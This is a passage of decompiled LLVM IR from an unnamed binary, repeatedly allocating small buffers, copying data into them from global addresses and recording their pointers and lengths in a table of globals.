  %v1_13e24 = trunc i32 %v0_13e24 to i8
  store i8 %v1_13e24, i8* bitcast (i32* @global_var_1da6d.413 to i8*), align 4
  %v1_13e28 = call i32 @_malloc(i32 %v0_13e18)
  %v0_13e2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13e28, i32* %r7.global-to-local, align 4
  %v3_13e38 = call i32 @function_14688(i32 %v1_13e28, i32 ptrtoint (i32* @global_var_15230.415 to i32), i32 %v0_13e2c)
  %v0_13e40 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13e40, i32* @global_var_1da70.416, align 4
  %v0_13e44 = load i32, i32* %r5.global-to-local, align 4
  %v1_13e44 = trunc i32 %v0_13e44 to i8
  store i8 %v1_13e44, i8* bitcast (i32* @global_var_1da74.417 to i8*), align 4
  %v0_13e48 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e48 = trunc i32 %v0_13e48 to i8
  store i8 %v1_13e48, i8* bitcast (i32* @global_var_1da75.418 to i8*), align 4
  %v1_13e4c = call i32 @_malloc(i32 15)
  store i32 %v1_13e4c, i32* %r5.global-to-local, align 4
  %v3_13e5c = call i32 @function_14688(i32 %v1_13e4c, i32 ptrtoint (i32* @global_var_15234.420 to i32), i32 15)
  store i32 15, i32* %r3.global-to-local, align 4
  store i8 15, i8* bitcast (i32* @global_var_1d9ec.421 to i8*), align 4
  %v0_13e6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e6c, i32* @global_var_1d9e8.422, align 4
  %v0_13e70 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e70 = trunc i32 %v0_13e70 to i8
  store i8 %v1_13e70, i8* bitcast (i32* @global_var_1d9ed.423 to i8*), align 4
  %v1_13e74 = call i32 @_malloc(i32 29)
  store i32 %v1_13e74, i32* %r5.global-to-local, align 4
  %v3_13e84 = call i32 @function_14688(i32 %v1_13e74, i32 ptrtoint (i32* @global_var_15244.425 to i32), i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  store i8 29, i8* bitcast (i32* @global_var_1da04.426 to i8*), align 4
  %v0_13e94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e94, i32* @global_var_1da00.427, align 4
  %v0_13e98 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e98 = trunc i32 %v0_13e98 to i8
  store i8 %v1_13e98, i8* bitcast (i32* @global_var_1da05.428 to i8*), align 4
  %v1_13e9c = call i32 @_malloc(i32 7)
  store i32 7, i32* %r7.global-to-local, align 4
  store i32 %v1_13e9c, i32* %r5.global-to-local, align 4
  %v4_13eb0 = call i32 @function_14688(i32 %v1_13e9c, i32 ptrtoint ([8 x i8]* @global_var_15264.430 to i32), i32 7)
  %v0_13eb8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13eb8, i32* @global_var_1da08.431, align 4
  %v0_13ebc = load i32, i32* %r7.global-to-local, align 4
  %v1_13ebc = trunc i32 %v0_13ebc to i8
  store i8 %v1_13ebc, i8* bitcast (i32* @global_var_1da0c.432 to i8*), align 4
  %v0_13ec0 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ec0 = trunc i32 %v0_13ec0 to i8
  store i8 %v1_13ec0, i8* bitcast (i32* @global_var_1da0d.433 to i8*), align 4
  %v1_13ec4 = call i32 @_malloc(i32 5)
  store i32 %v1_13ec4, i32* %r5.global-to-local, align 4
  %v4_13ed4 = call i32 @function_14688(i32 %v1_13ec4, i32 ptrtoint ([6 x i8]* @global_var_1526c.435 to i32), i32 5)
  store i32 5, i32* %r3.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1da14.436 to i8*), align 4
  %v0_13ee4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13ee4, i32* @global_var_1da10.437, align 4
  %v0_13ee8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ee8 = trunc i32 %v0_13ee8 to i8
  store i8 %v1_13ee8, i8* bitcast (i32* @global_var_1da15.438 to i8*), align 4
  %v1_13eec = call i32 @_malloc(i32 11)
  store i32 %v1_13eec, i32* %r5.global-to-local, align 4
  %v3_13efc = call i32 @function_14688(i32 %v1_13eec, i32 ptrtoint (i32* @global_var_15274.440 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1da1c.441 to i8*), align 4
  %v0_13f0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f0c, i32* @global_var_1da18.442, align 4
  %v0_13f10 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f10 = trunc i32 %v0_13f10 to i8
  store i8 %v1_13f10, i8* bitcast (i32* @global_var_1da1d.443 to i8*), align 4
  %v1_13f14 = call i32 @_malloc(i32 4)
  store i32 %v1_13f14, i32* %r5.global-to-local, align 4
  %v4_13f24 = call i32 @function_14688(i32 %v1_13f14, i32 ptrtoint ([5 x i8]* @global_var_15280.445 to i32), i32 4)
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_13f2c = load i32, i32* %r7.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1da24.446 to i8*), align 4
  %v0_13f34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f34, i32* @global_var_1da20.447, align 4
  %v0_13f38 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f38 = trunc i32 %v0_13f38 to i8
  store i8 %v1_13f38, i8* bitcast (i32* @global_var_1da25.448 to i8*), align 4
  %v1_13f3c = call i32 @_malloc(i32 %v0_13f2c)
  %v0_13f40 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13f3c, i32* %r5.global-to-local, align 4
  %v4_13f4c = call i32 @function_14688(i32 %v1_13f3c, i32 ptrtoint ([8 x i8]* @global_var_15288.450 to i32), i32 %v0_13f40)
  %v0_13f54 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f54, i32* @global_var_1da28.451, align 4
  %v0_13f58 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f58 = trunc i32 %v0_13f58 to i8
  store i8 %v1_13f58, i8* bitcast (i32* @global_var_1da2c.452 to i8*), align 4
  %v0_13f5c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f5c = trunc i32 %v0_13f5c to i8
  store i8 %v1_13f5c, i8* bitcast (i32* @global_var_1da2d.453 to i8*), align 4
  %v1_13f60 = call i32 @_malloc(i32 8)
  store i32 %v1_13f60, i32* %r5.global-to-local, align 4
  %v4_13f70 = call i32 @function_14688(i32 %v1_13f60, i32 ptrtoint ([9 x i8]* @global_var_15290.455 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1da34.456 to i8*), align 4
  %v0_13f80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f80, i32* @global_var_1da30.457, align 4
  %v0_13f84 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f84 = trunc i32 %v0_13f84 to i8
  store i8 %v1_13f84, i8* bitcast (i32* @global_var_1da35.458 to i8*), align 4
  %v1_13f88 = call i32 @_malloc(i32 13)
  store i32 %v1_13f88, i32* %r5.global-to-local, align 4
  %v3_13f98 = call i32 @function_14688(i32 %v1_13f88, i32 ptrtoint (i32* @global_var_1529c.460 to i32), i32 13)
  store i32 13, i32* %r3.global-to-local, align 4
  store i8 13, i8* bitcast (i32* @global_var_1da3c.461 to i8*), align 4
  %v0_13fa8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13fa8, i32* @global_var_1da38.462, align 4
  %v0_13fac = load i32, i32* %r6.global-to-local, align 4
  %v1_13fac = trunc i32 %v0_13fac to i8
  store i8 %v1_13fac, i8* bitcast (i32* @global_var_1da3d.463 to i8*), align 4
  %v1_13fb0 = call i32 @_malloc(i32 10)
  store i32 10, i32* %sl.global-to-local, align 4
  store i32 %v1_13fb0, i32* %r5.global-to-local, align 4
  %v4_13fc4 = call i32 @function_14688(i32 %v1_13fb0, i32 ptrtoint ([11 x i8]* @global_var_152ac.465 to i32), i32 10)
  %v0_13fcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13fcc, i32* @global_var_1da40.466, align 4
  store i8 10, i8* bitcast (i32* @global_var_1da44.467 to i8*), align 4
  %v0_13fd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13fd4 = trunc i32 %v0_13fd4 to i8
  store i8 %v1_13fd4, i8* bitcast (i32* @global_var_1da45.468 to i8*), align 4
  %v1_13fd8 = call i32 @_malloc(i32 10)
  %v0_13fe0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_13fd8, i32* %r5.global-to-local, align 4
  %v4_13fe8 = call i32 @function_14688(i32 %v1_13fd8, i32 ptrtoint ([11 x i8]* @global_var_152b8.470 to i32), i32 %v0_13fe0)
  %v0_13ff0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13ff0, i32* @global_var_1da48.471, align 4
  %v1_13ff4 = trunc i32 %v0_13fe0 to i8
  store i8 %v1_13ff4, i8* bitcast (i32* @global_var_1da4c.472 to i8*), align 4
  %v0_13ff8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ff8 = trunc i32 %v0_13ff8 to i8
  store i8 %v1_13ff8, i8* bitcast (i32* @global_var_1da4d.473 to i8*), align 4
  %v1_13ffc = call i32 @_malloc(i32 33)
  store i32 %v1_13ffc, i32* %r5.global-to-local, align 4
  %v3_1400c = call i32 @function_14688(i32 %v1_13ffc, i32 ptrtoint (i32* @global_var_152c4.475 to i32), i32 33)
  store i32 33, i32* %r3.global-to-local, align 4
  store i8 33, i8* bitcast (i32* @global_var_1da54.476 to i8*), align 4
  %v0_1401c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1401c, i32* @global_var_1da50.477, align 4
  %v0_14020 = load i32, i32* %r6.global-to-local, align 4
  %v1_14020 = trunc i32 %v0_14020 to i8
  store i8 %v1_14020, i8* bitcast (i32* @global_var_1da55.478 to i8*), align 4
  %v1_14024 = call i32 @_malloc(i32 8)
  store i32 %v1_14024, i32* %r5.global-to-local, align 4
  %v4_14034 = call i32 @function_14688(i32 %v1_14024, i32 ptrtoint ([9 x i8]* @global_var_152e8.480 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1da5c.481 to i8*), align 4
  %v0_14044 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14044, i32* @global_var_1da58.482, align 4
  %v0_14048 = load i32, i32* %r6.global-to-local, align 4
  %v1_14048 = trunc i32 %v0_14048 to i8
  store i8 %v1_14048, i8* bitcast (i32* @global_var_1da5d.483 to i8*), align 4
  %v1_1404c = call i32 @_malloc(i32 11)
  store i32 %v1_1404c, i32* %r5.global-to-local, align 4
  %v4_1405c = call i32 @function_14688(i32 %v1_1404c, i32 ptrtoint ([12 x i8]* @global_var_152f4.485 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1da64.486 to i8*), align 4
  %v0_1406c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1406c, i32* @global_var_1da60.487, align 4
  %v0_14070 = load i32, i32* %r6.global-to-local, align 4
  %v1_14070 = trunc i32 %v0_14070 to i8
  store i8 %v1_14070, i8* bitcast (i32* @global_var_1da65.488 to i8*), align 4
  %v1_14074 = call i32 @_malloc(i32 6)
  store i32 %v1_14074, i32* %r5.global-to-local, align 4
  %v4_14084 = call i32 @function_14688(i32 %v1_14074, i32 ptrtoint ([7 x i8]* @global_var_15300.490 to i32), i32 6)
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_1408c = load i32, i32* %r7.global-to-local, align 4
  store i8 6, i8* bitcast (i32* @global_var_1da7c.491 to i8*), align 4
  %v0_14094 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14094, i32* @global_var_1da78.492, align 4
  %v0_14098 = load i32, i32* %r6.global-to-local, align 4
  %v1_14098 = trunc i32 %v0_14098 to i8
  store i8 %v1_14098, i8* bitcast (i32* @global_var_1da7d.493 to i8*), align 4
  %v1_1409c = call i32 @_malloc(i32 %v0_1408c)
  %v0_140a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1409c, i32* %r5.global-to-local, align 4
  %v4_140ac = call i32 @function_14688(i32 %v1_1409c, i32 ptrtoint ([8 x i8]* @global_var_15308.495 to i32), i32 %v0_140a0)
  %v0_140b0 = load i32, i32* %r7.global-to-local, align 4
  %v0_140b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_140b4, i32* @global_var_1da80.496, align 4
  %v1_140b8 = trunc i32 %v0_140b0 to i8
  store i8 %v1_140b8, i8* bitcast (i32* @global_var_1da84.497 to i8*), align 4
  %v0_140bc = load i32, i32* %r6.global-to-local, align 4
  %v1_140bc = trunc i32 %v0_140bc to i8
  store i8 %v1_140bc, i8* bitcast (i32* @global_var_1da85.498 to i8*), align 4
  %v1_140c0 = call i32 @_malloc(i32 %v0_140b0)
  %v0_140c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_140c0, i32* %r5.global-to-local, align 4
  %v4_140d0 = call i32 @function_14688(i32 %v1_140c0, i32 ptrtoint ([8 x i8]* @global_var_15310.500 to i32), i32 %v0_140c4)
  %v0_140d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_140d8, i32* @global_var_1da88.501, align 4
  %v0_140dc = load i32, i32* %r7.global-to-local, align 4
  %v1_140dc = trunc i32 %v0_140dc to i8
  store i8 %v1_140dc, i8* bitcast (i32* @global_var_1da8c.502 to i8*), align 4
  %v0_140e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_140e0 = trunc i32 %v0_140e0 to i8
  store i8 %v1_140e0, i8* bitcast (i32* @global_var_1da8d.503 to i8*), align 4
  %v1_140e4 = call i32 @_malloc(i32 3)
  store i32 %v1_140e4, i32* %r5.global-to-local, align 4
  %v4_140f4 = call i32 @function_14688(i32 %v1_140e4, i32 ptrtoint ([4 x i8]* @global_var_15318.505 to i32), i32 3)
  store i32 3, i32* %r3.global-to-local, align 4
  store i8 3, i8* bitcast (i32* @global_var_1da94.506 to i8*), align 4
  %v0_14104 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14104, i32* @global_var_1da90.507, align 4
  %v0_14108 = load i32, i32* %r6.global-to-local, align 4
  %v1_14108 = trunc i32 %v0_14108 to i8
  store i8 %v1_14108, i8* bitcast (i32* @global_var_1da95.508 to i8*), align 4
  %v1_1410c = call i32 @_malloc(i32 19)
  store i32 %v1_1410c, i32* %r5.global-to-local, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_14120 = call i32 @function_14688(i32 %v1_1410c, i32 ptrtoint (i32* @global_var_1531c.510 to i32), i32 19)
  %v0_14128 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14128, i32* @global_var_1da98.511, align 4
  store i8 19, i8* bitcast (i32* @global_var_1da9c.512 to i8*), align 4
  %v0_14130 = load i32, i32* %r6.global-to-local, align 4
  %v1_14130 = trunc i32 %v0_14130 to i8
  store i8 %v1_14130, i8* bitcast (i32* @global_var_1da9d.513 to i8*), align 4
  %v1_14134 = call i32 @_malloc(i32 24)
  store i32 %v1_14134, i32* %r5.global-to-local, align 4
  %v3_14144 = call i32 @function_14688(i32 %v1_14134, i32 ptrtoint (i32* @global_var_15330.515 to i32), i32 24)
  store i32 24, i32* %r3.global-to-local, align 4
  store i8 24, i8* bitcast (i32* @global_var_1daa4.516 to i8*), align 4
  %v0_14154 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14154, i32* @global_var_1daa0.517, align 4
  %v0_14158 = load i32, i32* %r6.global-to-local, align 4
  %v1_14158 = trunc i32 %v0_14158 to i8
  store i8 %v1_14158, i8* bitcast (i32* @global_var_1daa5.518 to i8*), align 4
  %v1_1415c = call i32 @_malloc(i32 9)
  %v0_14168 = load i32, i32* %r7.global-to-local, align 4
  %v1_14168 = add i32 %v0_14168, 2
  store i32 %v1_14168, i32* %r7.global-to-local, align 4
  store i32 %v1_1415c, i32* %r5.global-to-local, align 4
  %v4_14170 = call i32 @function_14688(i32 %v1_1415c, i32 ptrtoint ([10 x i8]* @global_var_1534c.520 to i32), i32 9)
  %v0_14178 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14178, i32* @global_var_1daa8.521, align 4
  %v0_1417c = load i32, i32* %r7.global-to-local, align 4
  %v1_1417c = trunc i32 %v0_1417c to i8
  store i8 %v1_1417c, i8* bitcast (i32* @global_var_1daac.522 to i8*), align 4
  %v0_14180 = load i32, i32* %r6.global-to-local, align 4
  %v1_14180 = trunc i32 %v0_14180 to i8
  store i8 %v1_14180, i8* bitcast (i32* @global_var_1daad.523 to i8*), align 4
  %v1_14184 = call i32 @_malloc(i32 16)
  store i32 %v1_14184, i32* %r5.global-to-local, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_14198 = call i32 @function_14688(i32 %v1_14184, i32 ptrtoint (i32* @global_var_15358.525 to i32), i32 16)
  %v0_141a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141a0, i32* @global_var_1dab0.526, align 4
  store i8 16, i8* bitcast (i32* @global_var_1dab4.527 to i8*), align 4
  %v0_141a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_141a8 = trunc i32 %v0_141a8 to i8
  store i8 %v1_141a8, i8* bitcast (i32* @global_var_1dab5.528 to i8*), align 4
  %v1_141ac = call i32 @_malloc(i32 22)
  store i32 %v1_141ac, i32* %r5.global-to-local, align 4
  %v3_141bc = call i32 @function_14688(i32 %v1_141ac, i32 ptrtoint (i32* @global_var_1536c.530 to i32), i32 22)
  store i32 22, i32* %r3.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1dabc.531 to i8*), align 4
  %v0_141cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141cc, i32* @global_var_1dab8.532, align 4
  %v0_141d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_141d0 = trunc i32 %v0_141d0 to i8
  store i8 %v1_141d0, i8* bitcast (i32* @global_var_1dabd.533 to i8*), align 4
  %v1_141d4 = call i32 @_malloc(i32 21)
  store i32 %v1_141d4, i32* %r5.global-to-local, align 4
  %v3_141e4 = call i32 @function_14688(i32 %v1_141d4, i32 ptrtoint (i32* @global_var_15384.535 to i32), i32 21)
  store i32 21, i32* %r3.global-to-local, align 4
  store i8 21, i8* bitcast (i32* @global_var_1dac4.536 to i8*), align 4
  %v0_141f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_141f4, i32* @global_var_1dac0.537, align 4
  %v0_141f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_141f8 = trunc i32 %v0_141f8 to i8
  store i8 %v1_141f8, i8* bitcast (i32* @global_var_1dac5.538 to i8*), align 4
  %v1_141fc = call i32 @_malloc(i32 17)
  store i32 %v1_141fc, i32* %r5.global-to-local, align 4
  %v4_1420c = call i32 @function_14688(i32 %v1_141fc, i32 ptrtoint ([18 x i8]* @global_var_1539c.540 to i32), i32 17)
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_14214 = load i32, i32* %r8.global-to-local, align 4
  store i8 17, i8* bitcast (i32* @global_var_1dacc.541 to i8*), align 4
  %v0_1421c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1421c, i32* @global_var_1dac8.542, align 4
  %v0_14220 = load i32, i32* %r6.global-to-local, align 4
  %v1_14220 = trunc i32 %v0_14220 to i8
  store i8 %v1_14220, i8* bitcast (i32* @global_var_1dacd.543 to i8*), align 4
  %v1_14224 = call i32 @_malloc(i32 %v0_14214)
  %v0_1422c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_14224, i32* %r5.global-to-local, align 4
  %v3_14234 = call i32 @function_14688(i32 %v1_14224, i32 ptrtoint (i32* @global_var_153b0.545 to i32), i32 %v0_1422c)
  %v0_1423c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1423c, i32* @global_var_1dad0.546, align 4
  %v1_14240 = trunc i32 %v0_1422c to i8
  store i8 %v1_14240, i8* bitcast (i32* @global_var_1dad4.547 to i8*), align 4
  %v0_14244 = load i32, i32* %r6.global-to-local, align 4
  %v1_14244 = trunc i32 %v0_14244 to i8
  store i8 %v1_14244, i8* bitcast (i32* @global_var_1dad5.548 to i8*), align 4
  %v1_14248 = call i32 @_malloc(i32 23)
  store i32 %v1_14248, i32* %r5.global-to-local, align 4
  %v3_14258 = call i32 @function_14688(i32 %v1_14248, i32 ptrtoint (i32* @global_var_153c0.550 to i32), i32 23)
  store i32 23, i32* %r3.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1dadc.551 to i8*), align 4
  %v0_14268 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14268, i32* @global_var_1dad8.552, align 4
  %v0_1426c = load i32, i32* %r6.global-to-local, align 4
  %v1_1426c = trunc i32 %v0_1426c to i8
  store i8 %v1_1426c, i8* bitcast (i32* @global_var_1dadd.553 to i8*), align 4
  %v1_14270 = call i32 @_malloc(i32 83)
  store i32 %v1_14270, i32* %r5.global-to-local, align 4
  %v3_14280 = call i32 @function_14688(i32 %v1_14270, i32 ptrtoint (i32* @global_var_153d8.555 to i32), i32 83)
  store i32 83, i32* %r3.global-to-local, align 4
  store i8 83, i8* bitcast (i32* @global_var_1dae4.556 to i8*), align 4
  %v0_14290 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14290, i32* @global_var_1dae0.557, align 4
  %v0_14294 = load i32, i32* %r6.global-to-local, align 4
  %v1_14294 = trunc i32 %v0_14294 to i8
  store i8 %v1_14294, i8* bitcast (i32* @global_var_1dae5.558 to i8*), align 4
  %v1_14298 = call i32 @_malloc(i32 32)
  store i32 %v1_14298, i32* %r5.global-to-local, align 4
  %v3_142a8 = call i32 @function_14688(i32 %v1_14298, i32 ptrtoint (i32* @global_var_1542c.560 to i32), i32 32)
  store i32 32, i32* %r3.global-to-local, align 4
  store i8 32, i8* bitcast (i32* @global_var_1daec.561 to i8*), align 4
  %v0_142b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_142b8, i32* @global_var_1dae8.562, align 4
  %v0_142bc = load i32, i32* %r6.global-to-local, align 4
  %v1_142bc = trunc i32 %v0_142bc to i8
  store i8 %v1_142bc, i8* bitcast (i32* @global_var_1daed.563 to i8*), align 4
  %v1_142c0 = call i32 @_malloc(i32 48)
  store i32 %v1_142c0, i32* %r5.global-to-local, align 4
  %v3_142d0 = call i32 @function_14688(i32 %v1_142c0, i32 ptrtoint (i32* @global_var_15450.565 to i32), i32 48)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_142d8 = load i32, i32* %r8.global-to-local, align 4
  store i8 48, i8* bitcast (i32* @global_var_1daf4.566 to i8*), align 4
  %v0_142e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_142e0, i32* @global_var_1daf0.567, align 4
  %v0_142e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_142e4 = trunc i32 %v0_142e4 to i8
  store i8 %v1_142e4, i8* bitcast (i32* @global_var_1daf5.568 to i8*), align 4
  %v1_142e8 = call i32 @_malloc(i32 %v0_142d8)
  %v0_142f0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_142e8, i32* %r5.global-to-local, align 4
  %v3_142f8 = call i32 @function_14688(i32 %v1_142e8, i32 ptrtoint (i32* @global_var_15484.570 to i32), i32 %v0_142f0)
  %v0_142fc = load i32, i32* %r7.global-to-local, align 4
  %v0_14300 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14300, i32* @global_var_1daf8.571, align 4
  %v1_14304 = trunc i32 %v0_142f0 to i8
  store i8 %v1_14304, i8* bitcast (i32* @global_var_1dafc.572 to i8*), align 4
  %v0_14308 = load i32, i32* %r6.global-to-local, align 4
  %v1_14308 = trunc i32 %v0_14308 to i8
  store i8 %v1_14308, i8* bitcast (i32* @global_var_1dafd.573 to i8*), align 4
  %v1_1430c = call i32 @_malloc(i32 %v0_142fc)
  %v0_14310 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1430c, i32* %r5.global-to-local, align 4
  %v3_1431c = call i32 @function_14688(i32 %v1_1430c, i32 ptrtoint (i32* @global_var_15494.575 to i32), i32 %v0_14310)
  %v0_14320 = load i32, i32* %sl.global-to-local, align 4
  %v0_14324 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14324, i32* @global_var_1db00.576, align 4
  %v0_14328 = load i32, i32* %r7.global-to-local, align 4
  %v1_14328 = trunc i32 %v0_14328 to i8
  store i8 %v1_14328, i8* bitcast (i32* @global_var_1db04.577 to i8*), align 4
  %v0_1432c = load i32, i32* %r6.global-to-local, align 4
  %v1_1432c = trunc i32 %v0_1432c to i8
  store i8 %v1_1432c, i8* bitcast (i32* @global_var_1db05.578 to i8*), align 4
  %v1_14330 = call i32 @_malloc(i32 %v0_14320)
  %v0_14338 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_14330, i32* %r5.global-to-local, align 4
  %v3_14340 = call i32 @function_14688(i32 %v1_14330, i32 ptrtoint (i32* @global_var_154a0.580 to i32), i32 %v0_14338)
  %v0_14344 = load i32, i32* %r8.global-to-local, align 4
  %v0_14348 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14348, i32* @global_var_1db08.581, align 4
  %v1_1434c = trunc i32 %v0_14338 to i8
  store i8 %v1_1434c, i8* bitcast (i32* @global_var_1db0c.582 to i8*), align 4
  %v0_14350 = load i32, i32* %r6.global-to-local, align 4
  %v1_14350 = trunc i32 %v0_14350 to i8
  store i8 %v1_14350, i8* bitcast (i32* @global_var_1db0d.583 to i8*), align 4
  %v1_14354 = call i32 @_malloc(i32 %v0_14344)
  %v0_1435c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_14354, i32* %r5.global-to-local, align 4
  %v3_14364 = call i32 @function_14688(i32 %v1_14354, i32 ptrtoint (i32* @global_var_154ac.585 to i32), i32 %v0_1435c)
  %v0_14368 = load i32, i32* %fp.global-to-local, align 4
  %v0_1436c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1436c, i32* @global_var_1db10.586, align 4
  %v1_14370 = trunc i32 %v0_1435c to i8
  store i8 %v1_14370, i8* bitcast (i32* @global_var_1db14.587 to i8*), align 4
  %v0_14374 = load i32, i32* %r6.global-to-local, align 4
  %v1_14374 = trunc i32 %v0_14374 to i8
  store i8 %v1_14374, i8* bitcast (i32* @global_var_1db15.588 to i8*), align 4
  %v1_14378 = call i32 @_malloc(i32 %v0_14368)
  %v0_14380 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_14378, i32* %r5.global-to-local, align 4
  %v3_14388 = call i32 @function_14688(i32 %v1_14378, i32 ptrtoint (i32* @global_var_154bc.590 to i32), i32 %v0_14380)
  %v0_1438c = load i32, i32* %sb.global-to-local, align 4
  %v0_14390 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14390, i32* @global_var_1db18.591, align 4
  %v1_14394 = trunc i32 %v0_14380 to i8
  store i8 %v1_14394, i8* bitcast (i32* @global_var_1db1c.592 to i8*), align 4
  %v0_14398 = load i32, i32* %r6.global-to-local, align 4
  %v1_14398 = trunc i32 %v0_14398 to i8
  store i8 %v1_14398, i8* bitcast (i32* @global_var_1db1d.593 to i8*), align 4
  %v1_1439c = call i32 @_malloc(i32 %v0_1438c)
  %v0_143a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_1439c, i32* %r5.global-to-local, align 4
  %v3_143ac = call i32 @function_14688(i32 %v1_1439c, i32 ptrtoint (i32* @global_var_154d0.595 to i32), i32 %v0_143a4)
  %v0_143b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_143b4, i32* @global_var_1db20.596, align 4
  %v1_143b8 = trunc i32 %v0_143a4 to i8
  store i8 %v1_143b8, i8* bitcast (i32* @global_var_1db24.597 to i8*), align 4
  %v0_143bc = load i32, i32* %r6.global-to-local, align 4
  %v1_143bc = trunc i32 %v0_143bc to i8
  store i8 %v1_143bc, i8* bitcast (i32* @global_var_1db25.598 to i8*), align 4
  %v1_143c0 = call i32 @_malloc(i32 8)
  store i32 %v1_143c0, i32* %r5.global-to-local, align 4
  %v4_143d0 = call i32 @function_14688(i32 %v1_143c0, i32 ptrtoint ([9 x i8]* @global_var_154e4.600 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1db2c.601 to i8*), align 4
  %v0_143e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_143e0, i32* @global_var_1db28.602, align 4
  %v0_143e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_143e4 = trunc i32 %v0_143e4 to i8
  store i8 %v1_143e4, i8* bitcast (i32* @global_var_1db2d.603 to i8*), align 4
  %v1_143e8 = call i32 @_malloc(i32 11)
  store i32 %v1_143e8, i32* %r5.global-to-local, align 4
  %v3_143f8 = call i32 @function_14688(i32 %v1_143e8, i32 ptrtoint (i32* @global_var_153cc.605 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_14400 = load i32, i32* %r8.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1db34.606 to i8*), align 4
  %v0_14408 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14408, i32* @global_var_1db30.607, align 4
  %v0_1440c = load i32, i32* %r6.global-to-local, align 4
  %v1_1440c = trunc i32 %v0_1440c to i8
  store i8 %v1_1440c, i8* bitcast (i32* @global_var_1db35.608 to i8*), align 4
  %v1_14410 = call i32 @_malloc(i32 %v0_14400)
  %v0_14418 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_14410, i32* %r5.global-to-local, align 4
